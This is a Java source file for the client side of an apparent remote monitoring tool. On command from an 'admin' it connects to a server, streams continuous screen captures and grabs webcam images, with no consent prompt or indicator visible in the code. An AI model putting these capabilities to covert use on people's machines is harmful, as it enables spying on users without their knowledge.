package client;
import java.awt.AWTException;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.image.BufferedImage;
import java.net.InetAddress;
import java.net.UnknownHostException;

import com.github.sarxos.webcam.Webcam;

import client.clientdatas.Model;


public class Application implements NetworkListener {

	private CommandSession command;
	private MessagesSession messages;
	private Model model;

	@Override
	public void notifyConnection() {
		String name="";
		try {
			name = InetAddress.getLocalHost().getHostName();
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		if (model.isConnected()) {
			command.doDisconnect();
			command.close();
			command = null;
			messages.close();
			messages = null;
			model.setConnected (false);
		} else {
			command = new CommandSession();
			command.open();
			if (command.doConnect (name)) {
				messages = new MessagesSession(this);
				messages.open();
				model.setConnected (true);
			} 
			else {
				command = null;
			}
		}
	}


	public void start () {
		model = new Model ();
		java.awt.EventQueue.invokeLater(new Runnable() {
			@Override
			public void run() {
				notifyConnection();
			}
		});
	}




	public static void main(String[] args) {
		new Application().start();
	}


	@Override
	public void processControl(String admin) {
		model.setControlled(true);
		new Thread(new Runnable() {

			@Override
			public void run() {

				try {
					GraphicsDevice gd = GraphicsEnvironment.getLocalGraphicsEnvironment().getDefaultScreenDevice();
					int width = gd.getDisplayMode().getWidth();
					int height = gd.getDisplayMode().getHeight();
					Rectangle r=new Rectangle(0, 0, (int)width, (int)height);
					BufferedImage img;
					Robot rob=new Robot();
					while (model.getControlled())
					{
						img=rob.createScreenCapture(r);
						command.sendImage(admin,img);
					}
				} catch (AWTException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}).start();

	}


	@Override
	public boolean isControlled() {
		return model.getControlled();
	}


	@Override
	public void stopControl() {
		model.setControlled(false);
	}

	
	@Override
	public BufferedImage takePicture() {
		Webcam webcam = Webcam.getDefault();
		webcam.open();
		BufferedImage img=webcam.getImage();
		webcam.close();
		return img;
	}



}
